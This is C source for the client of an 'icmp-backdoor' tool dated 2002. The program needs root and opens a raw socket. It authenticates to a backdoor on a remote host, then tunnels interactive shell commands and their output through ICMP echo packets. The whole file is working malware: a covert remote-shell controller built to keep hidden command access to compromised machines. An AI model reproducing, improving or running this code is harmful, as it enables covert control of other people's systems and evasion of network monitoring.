/* Copyright (C) 2002 Martin J. Muench <mjm@codito.de> */

#include "config.h"

extern void sendpacket(char *, char *, int);

int main (int argc, char **argv) {

 int    numActiveFDs, maxFD, null=0, auth=0, cliseq=CLISEQ, srvseq=SRVSEQ;
 char   host[256], *payload, text[CHARS];
 u_char buf[1024];
 struct hostent	*hostent;
 fd_set readset;

 if (argc < 3)
 	printf("icmp-backdoor (client\n\nusage: ibd-client <host> <icmpcode>\n\n") ,exit(1);
 if (getuid() != 0)
        printf("you need to be root!\n\n"), exit(-1);
          
 icmpcode=atoi(argv[2]); 

 hostent = Gethostbyname(argv[1]);
 strncpy(host,inet_ntoa(*(struct in_addr*)hostent->h_addr_list[0]),256);

 rawsock = get_raw_sock();

 fprintf(stderr, "\nicmp-backdoor %s\n\nUse like a normal shell, avoid interactive programs like vi\n\n", VERSION);
 fprintf(stderr, "Connecting to %s...", host);

 maxFD = rawsock;
 FD_ZERO(&readset);

 sendpacket(PING, host, cliseq);

 for(;;) {
 
    FD_SET(rawsock, &readset);
    FD_SET(STDIN_FILENO, &readset);
    numActiveFDs = Select((maxFD + 1), &readset);
	
    if (FD_ISSET(rawsock, &readset)) {

	memset(buf,0,sizeof(buf));
        if (recvfrom(rawsock,buf,1024,0,(struct sockaddr *)&saddr,&null) < 0) 
		break;

	  ip=(struct ip *)buf;
	  icmp=(struct icmp *)&buf[ip->ip_hl<<2];

          if (icmp->icmp_seq == srvseq) {

	    if (!strcmp(host,inet_ntoa(ip->ip_src))) {

	    	payload = (buf + sizeof(struct ip) + sizeof(struct icmp));
	
	        if(!strncmp(payload, SID, strlen(SID))) {
			
			payload=(payload + strlen(SID));
		
		  	if(!strcmp(payload,PONG))
		    		fprintf(stderr, "connected.\n\n# "), auth++; 
   	          	else if (auth)
		 		fprintf(stderr, "%s", payload);
                }
             }
           }   
    }   
    else if (FD_ISSET(STDIN_FILENO, &readset)) { 
    
        memset(&text, 0, CHARS);

    	read(STDIN_FILENO, text, CHARS-1);

	if(strncmp(text, "exit", 4))
	  sendpacket(text, host, cliseq); 
 	else
 	  fprintf(stderr, "\nbye...\n"), exit(1);
   }
}
exit(0);
}
